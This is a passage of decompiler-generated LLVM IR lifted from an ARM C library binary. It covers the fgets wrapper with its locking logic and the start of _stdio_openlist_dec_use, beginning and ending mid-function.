  %v1_2b5d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b5d0 = inttoptr i32 %v0_2b5d0.pre to i32*
  %v2_2b5d0 = load i32, i32* %v1_2b5d0, align 4
  store i32 %v2_2b5d0, i32* %r3.global-to-local, align 4
  %v3_2b5d4 = icmp uge i32 %v2_2b5d0, %v1_2b5d4.pre
  store i1 %v3_2b5d4, i1* %cpsr_c.global-to-local, align 1
  %v9_2b5d4 = icmp eq i32 %v2_2b5d0, %v1_2b5d4.pre
  br i1 %v9_2b5d4, label %dec_label_pc_2b5dc, label %dec_label_pc_2b5f4

dec_label_pc_2b5f0:                               ; preds = %dec_label_pc_2b5dc
  %v0_2b5f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b5f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b5f4

dec_label_pc_2b5f4:                               ; preds = %dec_label_pc_2b5c4, %dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge, %dec_label_pc_2b5f0
  %v0_2b5fc = phi i32 [ %v0_2b5f0, %dec_label_pc_2b5f0 ], [ %v2_2b5d023, %dec_label_pc_2b5c4 ], [ %v2_2b5d0, %dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge ]
  %v1_2b5f4 = phi i32 [ %v0_2b5f0, %dec_label_pc_2b5f0 ], [ %v3_2b5c4, %dec_label_pc_2b5c4 ], [ %v1_2b5d4.pre, %dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge ]
  %v3_2b5f4 = icmp uge i32 %v0_2b5fc, %v1_2b5f4
  store i1 %v3_2b5f4, i1* %cpsr_c.global-to-local, align 1
  %v9_2b5f4 = icmp eq i32 %v0_2b5fc, %v1_2b5f4
  br i1 %v9_2b5f4, label %dec_label_pc_2b5fc, label %dec_label_pc_2b5f4.dec_label_pc_2b5c4_crit_edge

dec_label_pc_2b5f4.dec_label_pc_2b5c4_crit_edge:  ; preds = %dec_label_pc_2b5f4
  %v0_2b5c4.pre = load i32, i32* @r7, align 4
  %v0_2b5cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2b5c4

dec_label_pc_2b5fc:                               ; preds = %dec_label_pc_2b5f4
  %v2_2b5fc = icmp ne i32 %v1_2b5f4, 0
  store i1 %v2_2b5fc, i1* %cpsr_c.global-to-local, align 1
  %v7_2b600 = icmp slt i32 %v1_2b5f4, 2
  br i1 %v7_2b600, label %dec_label_pc_2b61c, label %dec_label_pc_2b604

dec_label_pc_2b604:                               ; preds = %dec_label_pc_2b5fc
  %v0_2b608 = load i32, i32* %r1.global-to-local, align 4
  %v1_2b608 = add i32 %v0_2b608, 129
  store i32 %v1_2b608, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b61c

dec_label_pc_2b61c:                               ; preds = %.thread, %dec_label_pc_2b5a8, %dec_label_pc_2b604, %dec_label_pc_2b5fc, %dec_label_pc_2b518
  %v0_2b61c = load i32, i32* %r5.global-to-local, align 4
  %v2_2b624 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2b624, i32* @r4, align 4
  store i32 %v6_2b4e8, i32* @r5, align 4
  store i32 %v9_2b4e8, i32* @r6, align 4
  store i32 %v12_2b4e8, i32* @r7, align 4
  store i32 %v15_2b4e8, i32* @lr, align 4
  ret i32 %v0_2b61c

; uselistorder directives
  uselistorder i32 %v0_2b5f0, { 1, 0, 2 }
  uselistorder i32 %v1_2b5d4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2b58c, { 1, 0, 2 }
  uselistorder i32 %v1_2b588, { 0, 2, 1 }
  uselistorder i32 %v1_2b548, { 1, 0 }
  uselistorder i32 %v3_2b500, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg1, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_2b61c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_2b5f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_2b5a8, { 1, 0 }
  uselistorder label %dec_label_pc_2b578, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_2b568, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_2b62c = load i32, i32* @r4, align 4
  store i32 %v3_2b62c, i32* %stack_var_-32, align 4
  %v6_2b62c = load i32, i32* @r5, align 4
  %v9_2b62c = load i32, i32* @r6, align 4
  %v12_2b62c = load i32, i32* @r7, align 4
  %v15_2b62c = load i32, i32* @r8, align 4
  %v24_2b62c = load i32, i32* @lr, align 4
  %v1_2b630 = add i32 %arg3, 52
  %v2_2b630 = inttoptr i32 %v1_2b630 to i32*
  %v3_2b630 = load i32, i32* %v2_2b630, align 4
  store i32 %v3_2b630, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b634 = icmp eq i32 %v3_2b630, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_2b634, label %dec_label_pc_2b648, label %dec_label_pc_2b6ac

dec_label_pc_2b648:                               ; preds = %entry
  %v0_2b648 = call i32 @__aeabi_read_tp()
  %v1_2b64c = add i32 %arg3, 64
  %v2_2b64c = inttoptr i32 %v1_2b64c to i32*
  %v3_2b64c = load i32, i32* %v2_2b64c, align 4
  store i32 %v3_2b64c, i32* %r3.global-to-local, align 4
  %v1_2b650 = add i32 %v0_2b648, -1168
  store i32 %v1_2b650, i32* @r8, align 4
  %v3_2b654 = icmp uge i32 %v3_2b64c, %v1_2b650
  store i1 %v3_2b654, i1* %cpsr_c.global-to-local, align 1
  %v9_2b654 = icmp eq i32 %v3_2b64c, %v1_2b650
  br i1 %v9_2b654, label %dec_label_pc_2b6a0, label %dec_label_pc_2b65c

dec_label_pc_2b65c:                               ; preds = %dec_label_pc_2b648
  %v1_2b65c = add i32 %arg3, 56
  store i32 %v1_2b65c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_2b65c, i32* %r2.global-to-local, align 4
  %v0_2b668 = load i32, i32* @r6, align 4
  store i32 %v0_2b668, i32* @r4, align 4
  %v1_2b66c36 = inttoptr i32 %v1_2b65c to i32*
  %v2_2b66c37 = load i32, i32* %v1_2b66c36, align 4
  store i32 %v2_2b66c37, i32* %r3.global-to-local, align 4
  %v3_2b67039 = icmp uge i32 %v2_2b66c37, %v0_2b668
  store i1 %v3_2b67039, i1* %cpsr_c.global-to-local, align 1
  %v9_2b67045 = icmp eq i32 %v2_2b66c37, %v0_2b668
  br i1 %v9_2b67045, label %dec_label_pc_2b678, label %dec_label_pc_2b690

dec_label_pc_2b678:                               ; preds = %dec_label_pc_2b65c, %dec_label_pc_2b678.dec_label_pc_2b66c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b688 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b688, label %dec_label_pc_2b68c, label %dec_label_pc_2b678.dec_label_pc_2b66c_crit_edge

dec_label_pc_2b678.dec_label_pc_2b66c_crit_edge:  ; preds = %dec_label_pc_2b678
  %v0_2b66c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b670.pre = load i32, i32* @r4, align 4
  %v1_2b66c = inttoptr i32 %v0_2b66c.pre to i32*
  %v2_2b66c = load i32, i32* %v1_2b66c, align 4
  store i32 %v2_2b66c, i32* %r3.global-to-local, align 4
  %v3_2b670 = icmp uge i32 %v2_2b66c, %v1_2b670.pre
  store i1 %v3_2b670, i1* %cpsr_c.global-to-local, align 1
  %v9_2b670 = icmp eq i32 %v2_2b66c, %v1_2b670.pre
  br i1 %v9_2b670, label %dec_label_pc_2b678, label %dec_label_pc_2b690

dec_label_pc_2b68c:                               ; preds = %dec_label_pc_2b678
  %v0_2b68c = load i32, i32* @r4, align 4
  store i32 %v0_2b68c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b690

dec_label_pc_2b690:                               ; preds = %dec_label_pc_2b65c, %dec_label_pc_2b678.dec_label_pc_2b66c_crit_edge, %dec_label_pc_2b68c
  %v0_2b690 = phi i32 [ %v0_2b68c, %dec_label_pc_2b68c ], [ %v2_2b66c37, %dec_label_pc_2b65c ], [ %v2_2b66c, %dec_label_pc_2b678.dec_label_pc_2b66c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b690 = icmp eq i32 %v0_2b690, 0
  br i1 %v2_2b690, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_2b690
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_2b690, %bb
  store i32 177820, i32* @lr, align 4
  %v1_2b698 = xor i1 %v2_2b690, true
  call void @__pseudo_cond_branch(i1 %v1_2b698, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2b69c = load i32, i32* @r8, align 4
  %v1_2b69c = load i32, i32* @r7, align 4
  %v2_2b69c = add i32 %v1_2b69c, 64
  %v3_2b69c = inttoptr i32 %v2_2b69c to i32*
  store i32 %v0_2b69c, i32* %v3_2b69c, align 4
  br label %dec_label_pc_2b6a0

dec_label_pc_2b6a0:                               ; preds = %dec_label_pc_2b648, %bb20
  %v0_2b6a0 = load i32, i32* @r7, align 4
  %v1_2b6a0 = add i32 %v0_2b6a0, 60
  %v2_2b6a0 = inttoptr i32 %v1_2b6a0 to i32*
  %v3_2b6a0 = load i32, i32* %v2_2b6a0, align 4
  %v1_2b6a4 = add i32 %v3_2b6a0, 1
  store i32 %v1_2b6a4, i32* %r3.global-to-local, align 4
  store i32 %v1_2b6a4, i32* %v2_2b6a0, align 4
  %v0_2b6ac.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_2b6b0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_2b6b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2b6ac

dec_label_pc_2b6ac:                               ; preds = %entry, %dec_label_pc_2b6a0
  %v0_2b6b4 = phi i32 [ %arg3, %entry ], [ %v0_2b6b4.pre, %dec_label_pc_2b6a0 ]
  %v0_2b6b0 = phi i32 [ %arg2, %entry ], [ %v0_2b6b0.pre, %dec_label_pc_2b6a0 ]
  %v0_2b6ac = phi i32 [ %arg1, %entry ], [ %v0_2b6ac.pre, %dec_label_pc_2b6a0 ]
  store i32 %v0_2b6b0, i32* %r1.global-to-local, align 4
  store i32 %v0_2b6b4, i32* %r2.global-to-local, align 4
  %v3_2b6b8 = inttoptr i32 %v0_2b6ac to i8*
  %v4_2b6b8 = call i32 @__GI_fgets_unlocked(i8* %v3_2b6b8, i32 %v0_2b6b0, i32 %v0_2b6b4)
  %v0_2b6bc = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b6bc = icmp eq i32 %v0_2b6bc, 0
  store i32 %v4_2b6b8, i32* %r8.global-to-local, align 4
  br i1 %v2_2b6bc, label %dec_label_pc_2b6c8, label %dec_label_pc_2b73c

dec_label_pc_2b6c8:                               ; preds = %dec_label_pc_2b6ac
  %v0_2b6c8 = load i32, i32* @r7, align 4
  %v1_2b6c8 = add i32 %v0_2b6c8, 60
  %v2_2b6c8 = inttoptr i32 %v1_2b6c8 to i32*
  %v3_2b6c8 = load i32, i32* %v2_2b6c8, align 4
  %v1_2b6cc = add i32 %v3_2b6c8, -1
  store i32 %v1_2b6cc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b6d0 = icmp eq i32 %v1_2b6cc, 0
  store i32 %v1_2b6cc, i32* %v2_2b6c8, align 4
  br i1 %v2_2b6d0, label %dec_label_pc_2b6dc, label %dec_label_pc_2b73c

dec_label_pc_2b6dc:                               ; preds = %dec_label_pc_2b6c8
  %v0_2b6dc = load i32, i32* %r3.global-to-local, align 4
  %v1_2b6dc = load i32, i32* @r7, align 4
  %v2_2b6dc = add i32 %v1_2b6dc, 64
  %v3_2b6dc = inttoptr i32 %v2_2b6dc to i32*
  store i32 %v0_2b6dc, i32* %v3_2b6dc, align 4
  %v0_2b6e0 = load i32, i32* @r7, align 4
  %v1_2b6e0 = add i32 %v0_2b6e0, 56
  store i32 %v1_2b6e0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b6e4

dec_label_pc_2b6e4:                               ; preds = %dec_label_pc_2b714.dec_label_pc_2b6e4_crit_edge, %dec_label_pc_2b6dc
  %v0_2b6ec = phi i32 [ %v0_2b6ec.pre, %dec_label_pc_2b714.dec_label_pc_2b6e4_crit_edge ], [ %v1_2b6e0, %dec_label_pc_2b6dc ]
  %v0_2b6e4 = phi i32 [ %v0_2b6e4.pre, %dec_label_pc_2b714.dec_label_pc_2b6e4_crit_edge ], [ %v0_2b6e0, %dec_label_pc_2b6dc ]
  %v1_2b6e4 = add i32 %v0_2b6e4, 56
  %v2_2b6e4 = inttoptr i32 %v1_2b6e4 to i32*
  %v3_2b6e4 = load i32, i32* %v2_2b6e4, align 4
  store i32 %v3_2b6e4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2b6ec, i32* %r2.global-to-local, align 4
  %v1_2b6f024 = inttoptr i32 %v0_2b6ec to i32*
  %v2_2b6f025 = load i32, i32* %v1_2b6f024, align 4
  store i32 %v2_2b6f025, i32* %r3.global-to-local, align 4
  %v3_2b6f427 = icmp uge i32 %v2_2b6f025, %v3_2b6e4
  store i1 %v3_2b6f427, i1* %cpsr_c.global-to-local, align 1
  %v9_2b6f433 = icmp eq i32 %v2_2b6f025, %v3_2b6e4
  br i1 %v9_2b6f433, label %dec_label_pc_2b6fc, label %dec_label_pc_2b714

dec_label_pc_2b6fc:                               ; preds = %dec_label_pc_2b6e4, %dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b70c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b70c, label %dec_label_pc_2b710, label %dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge

dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge:  ; preds = %dec_label_pc_2b6fc
  %v0_2b6f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b6f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b6f0 = inttoptr i32 %v0_2b6f0.pre to i32*
  %v2_2b6f0 = load i32, i32* %v1_2b6f0, align 4
  store i32 %v2_2b6f0, i32* %r3.global-to-local, align 4
  %v3_2b6f4 = icmp uge i32 %v2_2b6f0, %v1_2b6f4.pre
  store i1 %v3_2b6f4, i1* %cpsr_c.global-to-local, align 1
  %v9_2b6f4 = icmp eq i32 %v2_2b6f0, %v1_2b6f4.pre
  br i1 %v9_2b6f4, label %dec_label_pc_2b6fc, label %dec_label_pc_2b714

dec_label_pc_2b710:                               ; preds = %dec_label_pc_2b6fc
  %v0_2b710 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b714

dec_label_pc_2b714:                               ; preds = %dec_label_pc_2b6e4, %dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge, %dec_label_pc_2b710
  %v0_2b71c = phi i32 [ %v0_2b710, %dec_label_pc_2b710 ], [ %v2_2b6f025, %dec_label_pc_2b6e4 ], [ %v2_2b6f0, %dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge ]
  %v1_2b714 = phi i32 [ %v0_2b710, %dec_label_pc_2b710 ], [ %v3_2b6e4, %dec_label_pc_2b6e4 ], [ %v1_2b6f4.pre, %dec_label_pc_2b6fc.dec_label_pc_2b6f0_crit_edge ]
  %v3_2b714 = icmp uge i32 %v0_2b71c, %v1_2b714
  store i1 %v3_2b714, i1* %cpsr_c.global-to-local, align 1
  %v9_2b714 = icmp eq i32 %v0_2b71c, %v1_2b714
  br i1 %v9_2b714, label %dec_label_pc_2b71c, label %dec_label_pc_2b714.dec_label_pc_2b6e4_crit_edge

dec_label_pc_2b714.dec_label_pc_2b6e4_crit_edge:  ; preds = %dec_label_pc_2b714
  %v0_2b6e4.pre = load i32, i32* @r7, align 4
  %v0_2b6ec.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b6e4

dec_label_pc_2b71c:                               ; preds = %dec_label_pc_2b714
  %v2_2b71c = icmp ne i32 %v1_2b714, 0
  store i1 %v2_2b71c, i1* %cpsr_c.global-to-local, align 1
  %v7_2b720 = icmp slt i32 %v1_2b714, 2
  br i1 %v7_2b720, label %dec_label_pc_2b73c, label %dec_label_pc_2b724

dec_label_pc_2b724:                               ; preds = %dec_label_pc_2b71c
  %v0_2b728 = load i32, i32* %r1.global-to-local, align 4
  %v1_2b728 = add i32 %v0_2b728, 129
  store i32 %v1_2b728, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b73c

dec_label_pc_2b73c:                               ; preds = %dec_label_pc_2b6c8, %dec_label_pc_2b6ac, %dec_label_pc_2b724, %dec_label_pc_2b71c
  %v0_2b73c = load i32, i32* %r8.global-to-local, align 4
  %v2_2b740 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_2b740, i32* @r4, align 4
  store i32 %v6_2b62c, i32* @r5, align 4
  store i32 %v9_2b62c, i32* @r6, align 4
  store i32 %v12_2b62c, i32* @r7, align 4
  store i32 %v15_2b62c, i32* @r8, align 4
  store i32 %v24_2b62c, i32* @lr, align 4
  ret i32 %v0_2b73c

; uselistorder directives
  uselistorder i32 %v0_2b710, { 1, 0, 2 }
  uselistorder i32 %v1_2b6f4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2b6b0, { 1, 0 }
  uselistorder i32 %v0_2b6b4, { 1, 0 }
  uselistorder i32 %v1_2b670.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 11, 10, 1, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 10, 9, 1, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_2b73c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_2b714, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_2b6ac, { 1, 0 }
  uselistorder label %dec_label_pc_2b6a0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_2b690, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b678, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2b748 = load i32, i32* @r4, align 4
  store i32 %v3_2b748, i32* %stack_var_-20, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r5.global-to-local, align 4
  %v4_2b758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 176) to i32*), align 4
  store i32 %v4_2b758, i32* %r7.global-to-local, align 4
  %v0_2b75c = call i32 @__aeabi_read_tp()
  store i32 %v0_2b75c, i32* %r0.global-to-local, align 4
  %v1_2b760 = add i32 %v4_2b758, 8
  %v2_2b760 = inttoptr i32 %v1_2b760 to i32*
  %v3_2b760 = load i32, i32* %v2_2b760, align 4
  store i32 %v3_2b760, i32* %r3.global-to-local, align 4
  %v1_2b764 = add i32 %v0_2b75c, -1168
  store i32 %v1_2b764, i32* %r6.global-to-local, align 4
  %v3_2b768 = icmp uge i32 %v3_2b760, %v1_2b764
  store i1 %v3_2b768, i1* %cpsr_c.global-to-local, align 1
  %v9_2b768 = icmp eq i32 %v3_2b760, %v1_2b764
  br i1 %v9_2b768, label %dec_label_pc_2b7b4, label %dec_label_pc_2b774

dec_label_pc_2b774:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2b758, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_2b78093 = inttoptr i32 %v4_2b758 to i32*
  %v2_2b78094 = load i32, i32* %v1_2b78093, align 4
  store i32 %v2_2b78094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2b78496 = icmp eq i32 %v2_2b78094, 0
  br i1 %v9_2b78496, label %dec_label_pc_2b78c, label %dec_label_pc_2b7a4

dec_label_pc_2b78c:                               ; preds = %dec_label_pc_2b774, %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge
  %v0_2b78c97 = phi i32 [ %v1_2b784.pre, %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge ], [ 0, %dec_label_pc_2b774 ]
  store i32 %v0_2b78c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b79c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b79c, label %dec_label_pc_2b7a0, label %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge

dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge:  ; preds = %dec_label_pc_2b78c
  %v0_2b780.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2b784.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2b780 = inttoptr i32 %v0_2b780.pre to i32*
  %v2_2b780 = load i32, i32* %v1_2b780, align 4
  store i32 %v2_2b780, i32* %r3.global-to-local, align 4
  %v3_2b784 = icmp uge i32 %v2_2b780, %v1_2b784.pre
  store i1 %v3_2b784, i1* %cpsr_c.global-to-local, align 1
  %v9_2b784 = icmp eq i32 %v2_2b780, %v1_2b784.pre
  br i1 %v9_2b784, label %dec_label_pc_2b78c, label %dec_label_pc_2b7a4

dec_label_pc_2b7a0:                               ; preds = %dec_label_pc_2b78c
  %v0_2b7a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2b7a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b7a4

dec_label_pc_2b7a4:                               ; preds = %dec_label_pc_2b774, %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge, %dec_label_pc_2b7a0
  %v0_2b7a4 = phi i32 [ %v0_2b7a0, %dec_label_pc_2b7a0 ], [ %v2_2b78094, %dec_label_pc_2b774 ], [ %v2_2b780, %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge ]
  %v1_2b7a4 = phi i32 [ %v0_2b7a0, %dec_label_pc_2b7a0 ], [ 0, %dec_label_pc_2b774 ], [ %v1_2b784.pre, %dec_label_pc_2b78c.dec_label_pc_2b780_crit_edge ]
  %v3_2b7a4 = icmp uge i32 %v0_2b7a4, %v1_2b7a4
  store i1 %v3_2b7a4, i1* %cpsr_c.global-to-local, align 1
  %v9_2b7a4 = icmp eq i32 %v0_2b7a4, %v1_2b7a4
  br i1 %v9_2b7a4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_2b7a4
  %v1_2b7a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_2b7a8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_2b7a4, %bb
  %v1_2b7ac = xor i1 %v9_2b7a4, true
  call void @__pseudo_cond_branch(i1 %v1_2b7ac, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2b7b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_2b7b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_2b7b0 = add i32 %v1_2b7b0, 8
  %v3_2b7b0 = inttoptr i32 %v2_2b7b0 to i32*
  store i32 %v0_2b7b0, i32* %v3_2b7b0, align 4
  br label %dec_label_pc_2b7b4

dec_label_pc_2b7b4:                               ; preds = %entry, %bb45
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2b7b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b7b8 = add i32 %v0_2b7b8, 176
  %v3_2b7b8 = inttoptr i32 %v2_2b7b8 to i32*
  %v4_2b7b8 = load i32, i32* %v3_2b7b8, align 4
  store i32 %v4_2b7b8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_2b7c0 = add i32 %v0_2b7b8, 12
  %v3_2b7c0 = inttoptr i32 %v2_2b7c0 to i32*
  %v4_2b7c0 = load i32, i32* %v3_2b7c0, align 4
  store i32 %v4_2b7c0, i32* %r3.global-to-local, align 4
  %v1_2b7c4 = inttoptr i32 %v4_2b7c0 to i32*
  %v2_2b7c4 = load i32, i32* %v1_2b7c4, align 4
  store i32 %v2_2b7c4, i32* %r1.global-to-local, align 4
  %v1_2b7c8 = add i32 %v4_2b7b8, 4
  %v2_2b7c8 = inttoptr i32 %v1_2b7c8 to i32*
  %v3_2b7c8 = load i32, i32* %v2_2b7c8, align 4
  %v2_2b7cc = icmp ne i32 %v2_2b7c4, 0
  store i1 %v2_2b7cc, i1* %cpsr_c.global-to-local, align 1
  %v7_2b7cc = icmp eq i32 %v2_2b7c4, 1
  %v1_2b7d0 = add i32 %v3_2b7c8, 1
  store i32 %v1_2b7d0, i32* %r3.global-to-local, align 4
  store i32 %v1_2b7d0, i32* %v2_2b7c8, align 4
  br i1 %v7_2b7cc, label %dec_label_pc_2b7dc, label %dec_label_pc_2b940

dec_label_pc_2b7dc:                               ; preds = %dec_label_pc_2b7b4
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_2b7e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b7e0 = add i32 %v0_2b7e0, 92
  %v3_2b7e0 = inttoptr i32 %v2_2b7e0 to i32*
  %v4_2b7e0 = load i32, i32* %v3_2b7e0, align 4
  store i32 %v4_2b7e0, i32* %r3.global-to-local, align 4
  %v1_2b7e4 = inttoptr i32 %v4_2b7e0 to i32*
  %v2_2b7e4 = load i32, i32* %v1_2b7e4, align 4
  store i32 %v2_2b7e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_2b7e4, 1
  br i1 %tmp46, label %dec_label_pc_2b940, label %dec_label_pc_2b7f0

dec_label_pc_2b7f0:                               ; preds = %dec_label_pc_2b7dc
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_2b7f4 = add i32 %v0_2b7e0, 168
  %v3_2b7f4 = inttoptr i32 %v2_2b7f4 to i32*
  %v4_2b7f4 = load i32, i32* %v3_2b7f4, align 4
  store i32 %v4_2b7f4, i32* %r7.global-to-local, align 4
  %v1_2b7f8 = add i32 %v4_2b7f4, 8
  %v2_2b7f8 = inttoptr i32 %v1_2b7f8 to i32*
  %v3_2b7f8 = load i32, i32* %v2_2b7f8, align 4
  store i32 %v3_2b7f8, i32* %r3.global-to-local, align 4
  %v1_2b7fc = load i32, i32* %r6.global-to-local, align 4
  %v3_2b7fc = icmp uge i32 %v3_2b7f8, %v1_2b7fc
  store i1 %v3_2b7fc, i1* %cpsr_c.global-to-local, align 1
  %v9_2b7fc = icmp eq i32 %v3_2b7f8, %v1_2b7fc
  br i1 %v9_2b7fc, label %dec_label_pc_2b840, label %dec_label_pc_2b804

dec_label_pc_2b804:                               ; preds = %dec_label_pc_2b7f0
  store i32 %v4_2b7f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_2b80c86 = inttoptr i32 %v4_2b7f4 to i32*
  %v2_2b80c87 = load i32, i32* %v1_2b80c86, align 4
  store i32 %v2_2b80c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2b81089 = icmp eq i32 %v2_2b80c87, 0
  br i1 %v9_2b81089, label %dec_label_pc_2b818, label %dec_label_pc_2b830

